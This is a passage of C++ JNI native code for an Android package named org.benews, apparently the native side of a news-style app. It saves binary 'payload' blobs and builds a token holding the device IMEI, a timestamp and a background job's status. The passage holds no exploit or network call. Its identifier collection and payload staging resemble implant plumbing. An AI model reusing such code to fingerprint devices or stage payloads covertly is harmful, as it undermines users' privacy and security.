         GetJStringContent(env, basedir, basedir_str);
         logd("returning %s", res.c_str());
         int a;
         const char *payloadArray = payload.binData(a);
         resS = save_payload_type(basedir_str, type.Int(), ts.Long(), frag.Int(), title_str, headline_str, content_str, (char *) payloadArray, a, sha1_str, env);
      }
   } else {
      // env->ReleaseByteArrayElements(bson_s,arry, JNI_ABORT);
   }
}

return resS;
}

JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, jclass, jstring imei, jlong ts, jstring lts_status)
{
bob bson;
string imei_str, lts_status_str;
CheckMutex();
GetJStringContent(env, imei, imei_str);
GetJStringContent(env, lts_status, lts_status_str);
logd(KKK"lts_status imei=%s ts=%d lts=%s", imei_str.c_str(), ts, lts_status_str.c_str());
checkExpirations(KKK"log.tmp",5*60);
checkExpirations(KKK"shtmp",30);
bson.append("imei", imei_str.c_str());
if (threadStarted) {
   logd("getToken thread running..");
   if (pthread_mutex_trylock(&mux_running) == 0) {
      logd("job finished, join it");
      void *status;
      if (pthread_join(th, &status)) {
         logd("failed to join Thread");
      } else {
         int* st = (int*) status;
         logd("Thread returns %d", *st);
         string value = boost::lexical_cast<std::string>(*st);
         bson.append("lts_status", value.c_str());
      }
      threadStarted = false;
      pthread_mutex_unlock(&mux_running);
   } else {
      logd("job not finished,");
      string value = boost::lexical_cast<std::string>(-3);
      //lts_status in realta' e' il checksum ritornato dalla serialize
      bson.append("lts_status", value.c_str());
   }
} else {
   //lts_status in realta' e' il checksum ritornato dalla serialize
   bson.append("lts_status", lts_status_str.c_str());
}
bson.append("ts", ts);
bo ret = bson.obj();
jbyteArray arr = env->NewByteArray(ret.objsize());
env->SetByteArrayRegion(arr, 0, ret.objsize(), (jbyte*) ret.objdata());
return arr;
}

